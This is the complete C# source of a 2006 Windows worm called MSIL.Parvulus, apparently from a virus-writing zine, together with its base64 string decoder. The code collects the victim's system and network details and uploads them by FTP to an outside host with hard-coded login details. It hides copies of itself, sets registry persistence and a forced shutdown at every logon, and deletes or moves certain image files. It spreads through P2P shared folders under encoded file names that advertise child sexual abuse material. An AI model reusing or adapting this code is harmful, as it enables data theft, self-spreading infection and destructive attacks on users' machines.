					   
					  _             
                     |_)  _ _|_  ._  _ 
                     | \ (/_ |_  |  (_)              www.pugnax.co.uk
					*************************************************
					**               MSIL.Parvulus                 **
					**               (W32.Lupar.A)                 **
					**                March 2006                   **
					*************************************************
						          Anarchistic Sadistic
						          
		http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=WORM_LUPAR.A


        --[Program.cs]--
        
        using Microsoft.Win32;
        using Retro.FTP;
        using System;
        using System.Collections;
        using System.Diagnostics;
        using System.IO;
        using System.Net;
        using System.Reflection;
        using System.Text;
        using System.Windows.Forms;
        using System.Xml;
         
        namespace parvulus
        {
            public class Program
            {
                private static object g;
                private static Module me;
         
                [STAThreadAttribute()]
                private static void Main()
                {
                    ArrayList list1 = new ArrayList();
                    FTPClient client1 = new FTPClient();
                    Random random1 = new Random();
                    DateTime time1 = DateTime.Now;
         
                    ProcessStartInfo info1 = new ProcessStartInfo("shutdown.exe", "-f");
         
                    string text1 = Program.RandName(".txt");
                    string text2 = Environment.SystemDirectory.ToString();
                    int num1 = 0;
                    string[] textArray1 = new string[] { Program.decrypt("cHRoYw=="), Program.decrypt("UGhvdG8gQnkgQ2FybCAtIFBlZG8="), Program.decrypt("cHJldGVlbg=="), Program.decrypt("Y2hpbGRsb3Zlcg=="), Program.decrypt("Y2hpbGQgcG9ybg=="), Program.decrypt("OHlv"), Program.decrypt("OXlv"), Program.decrypt("MTB5bw=="), Program.decrypt("MTF5bw=="), Program.decrypt("MTJ5bw==") };
                    string text3 = Dns.GetHostName();
         
                    IPHostEntry entry1 = Dns.GetHostEntry(text3);
                    IPAddress[] addressArray1 = entry1.AddressList;
         
                    StreamWriter writer1 = new StreamWriter(text2 + Program.decrypt("XA==") + text1);
                    writer1.WriteLine(Program.decrypt("W1BhcnZ1bHVzXSBBdXRvLUdlbmVyYXRlZCBPbiA=") + time1.ToString("dddd, d MMMM yyyy H:m:s zzz \r\n"));
                    writer1.WriteLine(Program.decrypt("T1MgVmVyc2lvbiAgIDog") + Environment.OSVersion);
                    writer1.WriteLine(Program.decrypt("TWFjaGluZSBOYW1lIDog") + Environment.MachineName);
                    writer1.WriteLine(Program.decrypt("VXNlcm5hbWUgICAgIDog") + Environment.UserName);
                    writer1.WriteLine(Program.decrypt("SG9zdCBOYW1lICAgIDog") + text3);
         
                    for (int num2 = 0; num2 < addressArray1.Length; num2++)
                    {
                        writer1.WriteLine(Program.decrypt("SVAgQWRkcmVzcyB7MH0gOiB7MX0g"), num2, addressArray1[num2].ToString());
                    }
         
                    writer1.Write("\r\n\t\t\t\t" + Program.decrypt("T3JpZ2luYWwgRmlsZSAtPiBCYWNrdXAgRmlsZQ==") + "\r\n\r\n");
         
                    Program.me = Assembly.GetExecutingAssembly().GetModules()[0];
                    string[] textArray2 = Directory.GetLogicalDrives();
         
                    foreach (string text4 in textArray2)
                    {
                        try
                        {
                            Program.CollectDirs(text4, list1);
                        }
                        catch (IOException)
                        {
                        }
                    }
         
                    int num3 = random1.Next(0, list1.Count);
         
                    File.Copy(Program.me.FullyQualifiedName, list1[num3] + @"\" + Program.me.ScopeName);
                    DirectoryInfo info2 = new DirectoryInfo(list1[num3] + @"\" + Program.me.ScopeName);
                    info2.Attributes = FileAttributes.Hidden;
         
                    RegistryKey key1 = Registry.CurrentUser.CreateSubKey(Program.decrypt("U29mdHdhcmVcUmV0cm9cUGFydmFsdXM="));
                    key1.SetValue(Program.decrypt("UGFydnVsdXM="), list1[num3] + @"\" + Program.me.ScopeName);
                    key1.SetValue(Program.decrypt("QWN0aXZl"), Program.decrypt("MA=="));
                    text2 = Environment.SystemDirectory.ToString();
         
                    Directory.CreateDirectory(text2 + Program.decrypt("XHBcYVxyXHZcdVxsXHVccw=="));
                    DirectoryInfo info3 = new DirectoryInfo(text2 + Program.decrypt("XHA="));
                    info3.Attributes = FileAttributes.Hidden;
         
                    foreach (string text5 in list1)
                    {
                        try
                        {
                            string[] textArray3 = Directory.GetFiles(text5, "*.jpg");
         
                            foreach (string text6 in textArray3)
                            {
                                try
                                {
                                    FileInfo info4 = new FileInfo(text6);
         
                                    for (int num4 = 0; num4 < 10; num4++)
                                    {
                                        if (info4.Name.Contains(textArray1[num4]))
                                        {
                                            key1.SetValue(Program.decrypt("QWN0aXZl"), Program.decrypt("MQ=="));
                                            string[] textArray4 = Directory.GetFiles(text2 + Program.decrypt("XHBcYVxyXHZcdVxsXHVcc1w="));         
                                            num1 = textArray4.Length;       
                                            File.Copy(text6, text2 + Program.decrypt("XHBcYVxyXHZcdVxsXHVcc1w=") + Program.decrypt("aW1wZWRv") + num1.ToString() + ".jpg");
                                            File.Delete(text6);         
                                            writer1.WriteLine(text6 + " -> " + text2 + Program.decrypt("XHBcYVxyXHZcdVxsXHVcc1w=") + Program.decrypt("aW1wZWRv") + num1.ToString() + ".jpg");
                                            num1++;
                                        }
                                    }
                                }
                                catch { }
                            }
                    continue;
                }
                catch
                {
                    continue;
                }
            }
 
            writer1.Close();
 
            Program.p2pShares();
            Program.g = key1.GetValue(Program.decrypt("QWN0aXZl"));
 
            if (Program.g.ToString() == Program.decrypt("MQ=="))
            {
                Application.EnableVisualStyles();
                Application.Run(new Form1());
            }
 
            client1.setHost(Program.decrypt("ZnRwLmhvc3Quc2s="));
            client1.setPort(0x15);
            client1.setUser(Program.decrypt("cGFydnVsdXM="));
            client1.setPass(Program.decrypt("ZjQ1NTQ2NHBwOQ=="));
            client1.login();
            client1.chdir(Program.decrypt("ZmlsZXM="));
            client1.setBinaryMode(true);
            client1.upload(text2 + Program.decrypt("XA==") + text1);
            client1.close();
 
            File.Delete(text2 + Program.decrypt("XA==") + text1);
            key1 = Registry.LocalMachine.CreateSubKey(Program.decrypt("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25ccG9saWNpZXNcZXhwbG9yZXJccnVu"));
            key1.SetValue(Program.decrypt("c2h1dGRvd24="), Program.decrypt("Y21kLmV4ZSAvYyBzaHV0ZG93biAtZg=="));
 
            Process.Start(info1);
            key1.Close();
        }
 
        private static string decrypt(string s)
        {
            StringBuilder builder1 = new StringBuilder();
            char[] chArray1 = s.ToCharArray();
            byte[] buffer1 = new decrypter(chArray1).GetDecoded();
            builder1.Append(Encoding.UTF8.GetChars(buffer1));
            return builder1.ToString();
        }
 
        private static string RandName(string extension)
        {
            Random random1 = new Random();
            string text1 = null;
            int num1 = random1.Next(5, 11);
            for (int num2 = 0; num2 < num1; num2++)
            {
                if (random1.Next(1, 3) == 2)
                {
                    text1 = text1 + Convert.ToChar(Convert.ToInt16(random1.Next(0x61, 0x7a)));
                }
                text1 = text1 + random1.Next(0, 10).ToString();
            }
            return (text1 + extension);
        }
 
        private static void CollectDirs(string dir, ArrayList storage)
        {
            try
            {
                string[] textArray1 = Directory.GetDirectories(dir);
                foreach (string text1 in textArray1)
                {
                    storage.Add(text1);
                    Program.CollectDirs(text1, storage);
                }
            }
            catch (UnauthorizedAccessException) { }
        }
 
        private static void p2pShares()
        {
            string[] textArray1 = new string[] { Program.decrypt("TXlfR2lybF85eW9fMDQyLmpwZy5leGU="), Program.decrypt("cHRoY19wcmUtU2xpZGVzaG93Ljg3cGl4cy5qcGcuZXhl"), Program.decrypt("UGVkbyAtIDIgMTN5byBnaXJsIG1hc3R1cmJhdGluZyAxNHlvIGJveS5qcGcuZXhl"), Program.decrypt("cHJldGVlbiAtIEVtaWx5IDd5ciBwZWRvIGZ1Y2suanBnLmV4ZQ=="), Program.decrypt("TkVXISAyX1BlZG8gUGVkb2ZpbGlhIEtpZHMgQ2hpbGQgUG9ybiA2NjYuanBnLmV4ZQ=="), Program.decrypt("MiA5eW8gZ2lybHMgYW5kIDEyeW8gYm95LmpwZy5leGU=") };
            object obj1 = null;
            obj1 = Registry.LocalMachine.OpenSubKey(Program.decrypt("U09GVFdBUkVcREMrKw==")).GetValue(Program.decrypt("SW5zdGFsbF9EaXI="));
 
            if (obj1 != null)
            {
                XmlReader reader1 = XmlReader.Create((obj1 + Program.decrypt("XA==")) + Program.decrypt("RENQbHVzUGx1cy54bWw="));
 
                while (reader1.Read())
                {
                    if (reader1.Name == Program.decrypt("RGlyZWN0b3J5"))
                    {
                        string text1 = reader1.ReadString();
 
                        if (Directory.Exists(text1))
                        {
                            foreach (string text2 in textArray1)
                            {
                                File.Copy(Program.me.FullyQualifiedName, text1 + text2);
                            }
                        }
                    }
                }
                reader1.Close();
            }
 
            string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Program.decrypt("ZURvbmtleTIwMDAgRG93bmxvYWRzXA==");
 
            if (Directory.Exists(text3))
            {
                foreach (string text4 in textArray1)
                {
                    File.Copy(Program.me.FullyQualifiedName, text3 + text4);
                }
            }
 
            RegistryKey key1 = Registry.LocalMachine.OpenSubKey(Program.decrypt("U09GVFdBUkVcS2F6YWFcTG9jYWxDb250ZW50"));
            obj1 = key1.GetValue(Program.decrypt("RG93bmxvYWREaXI="));
 
            if (obj1 != null)
            {
                obj1 = obj1 + Program.decrypt("XA==");
 
                foreach (string text5 in textArray1)
                {
                    File.Copy(Program.me.FullyQualifiedName, obj1 + text5);
                }
            }
            key1.Close();
                    }
                }
            }


        --[Decryptor.cs]--
        
        using System;
        using System.Collections.Generic;
        using System.Text;
         
        namespace parvulus
        {
            public class decrypter
            {
                char[] source;
	        int length, length2, length3;
	        int blockCount;
	        int paddingCount;
         
                public decrypter(char[] input)
	        {
		        int temp=0;
		        source=input;
		        length=input.Length;
         
		        for (int x=0;x<2;x++)
		        {
			        if(input[length-x-1]=='=')
				        temp++;
			        }
         
			        paddingCount=temp;
			        blockCount=length/4;
			        length2=blockCount*3;
		        }
         
		        public byte[] GetDecoded()
		        {
			        byte[] buffer=new byte[length];
			        byte[] buffer2=new byte[length2];
         
			        for(int x=0;x<length;x++)
			        {
				        buffer[x]=char2sixbit(source[x]);
			        }
         
			        byte b, b1,b2,b3;
			        byte temp1, temp2, temp3, temp4;
         
			        for(int x=0;x<blockCount;x++)
			        {
				        temp1=buffer[x*4];
				        temp2=buffer[x*4+1];
				        temp3=buffer[x*4+2];
				        temp4=buffer[x*4+3];				
         
				        b=(byte)(temp1<<2);
				        b1=(byte)((temp2 & 48)>>4);
				        b1+=b;
				        b=(byte)((temp2 & 15)<<4);
				        b2=(byte)((temp3 & 60)>>2);
				        b2+=b;
				        b=(byte)((temp3 & 3)<<6);
				        b3=temp4;
				        b3+=b;
				        buffer2[x*3]=b1;
				        buffer2[x*3+1]=b2;
				        buffer2[x*3+2]=b3;
			        }
         
			        length3=length2-paddingCount;
			        byte[] result=new byte[length3];
         
			        for(int x=0;x<length3;x++)
			        {
				        result[x]=buffer2[x];
			        }
			        return result;
		        }
         
		        private byte char2sixbit(char c)
		        {
			        char[] lookupTable=new char[64]
			        {	'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
				        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
				        '0','1','2','3','4','5','6','7','8','9','+','/'};
         
			        if(c=='=')
				        return 0;
			        else
			        {
				        for (int x=0;x<64;x++)
				        {
					        if (lookupTable[x]==c)
						        return (byte)x;
				        }
				        return 0;
			        }
                        }
               }
        }
